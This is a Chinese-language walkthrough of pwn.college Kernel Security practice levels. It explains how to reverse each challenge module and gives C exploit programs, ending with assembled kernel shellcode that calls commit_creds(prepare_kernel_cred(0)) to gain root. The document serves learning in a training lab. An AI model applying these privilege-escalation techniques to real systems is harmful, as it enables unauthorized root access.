# Practice-Pwncollege

`pwn.college`提供了linux kernel相关的学习资料和练习。太好了，直接跟着学

## [Kernel Security](https://pwn.college/system-security/kernel-security)

`levelx.1`的解法与`levelx.0`完全相同，此处省略

### level1.0

建议阅读完`Lectures and Reading`的前三项（直到读完`Kernel: Kernel Modules`）再做这题（虽然题目很简单）

`/challenge`下有一个`.ko`文件。`.ko`其实就是elf，直接正常反编译即可

`init_module`函数里有一句`proc_create("pwncollege", 438, 0, &fops)`，说明我们可以从`/proc/pwncollege`与这个模块通信。`device_write`中将输入的内容与硬编码的密码进行比对，结果存入`device_state[0]`。`device_read`中，若`device_state[0]`等于0，则输出flag。好的这是一个逆向题而不是pwn（

直接在终端就能解：
```sh
echo "password" > /proc/pwncollege
cat /proc/pwncollege
```
（怀疑每个环境的密码不同，以下省略具体的密码）

### level2.0

继续是硬编码的密码。flag输出到了内核日志里，可以用`dmesg`查看。不知道为什么，ida似乎反编译失败了，ghidra里是这样：`printk(&DAT_00100658,flag)`；而ida pro里是这样的：`printk(&unk_618)`，完全没有flag的踪影

### level3.0

输入正确的密码可以得到root权限，进而可以直接`cat /flag`得到flag

### level4.0

做之前可以看一下`Kernel: Privilege Escalation`的内容，但也不是很有必要……

仍然是输密码，但需要编写C脚本调用ioctl
```c
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdlib.h>
int main() {
    int fd = open("/proc/pwncollege", O_RDWR);
    char password[] = "";
    ioctl(fd, 1337, &password);
    system("cat /flag");
    return 0;
}
```
编译：`gcc ./exp.c -o ./exp`

### level5.0

`device_ioctl`会将参数的值当作地址，并执行地址指向的内容。同时模块里存在一个win函数。唯一的问题是我们似乎不知道win函数的具体地址？kernel似乎每次加载都会改动基地址？

运行`dmesg | grep -i kaslr`后可以发现启动kernel时带了`nokaslr`。那没事了。在practice环境里看一眼win函数的地址：`sudo cat /proc/kallsyms | grep win`，然后直接用就好
```c
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdlib.h>
int main() {
    int fd = open("/proc/pwncollege", O_RDWR);
    unsigned long addr=0xffffffffc000012d;
    ioctl(fd, 1337, addr);
    system("cat /flag");
    return 0;
}
```

### level6.0

建议阅读`Kernel Security: Writing Kernel Shellcode`后再做这题

在kernel中运行的shellcode没法用syscall，因为调用syscall时系统会认为当前需要切换至内核态，并做一些相应的假设。而这些假设放到kernel里会崩溃。不过还好我们也不需要做太复杂的东西，调用经典的`commit_creds(prepare_kernel_cred(0))`拿到root权限后回到用户态读flag即可

仍然没有kaslr。在`/proc/kallsyms`中找到这两个函数的地址后编写shellcode
```
xor rdi,rdi
mov rax,0xffffffff81089660
call rax
mov rdi,rax
mov rax,0xffffffff81089310
call rax
ret
```
```c
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
int main() {
    int fd = open("/proc/pwncollege", O_RDWR);
    char shellcode[]="\x48\x31\xFF\x48\xC7\xC0\x60\x96\x08\x81\xFF\xD0\x48\x89\xC7\x48\xC7\xC0\x10\x93\x08\x81\xFF\xD0\xC3";
    write(fd,shellcode,sizeof(shellcode));
    system("cat /flag");
    return 0;
}
```
另外，shellcode末尾的ret是必须的。内核中运行的shellcode不能出现崩溃的情况，不然整个内核直接炸掉，甚至来不及拿到flag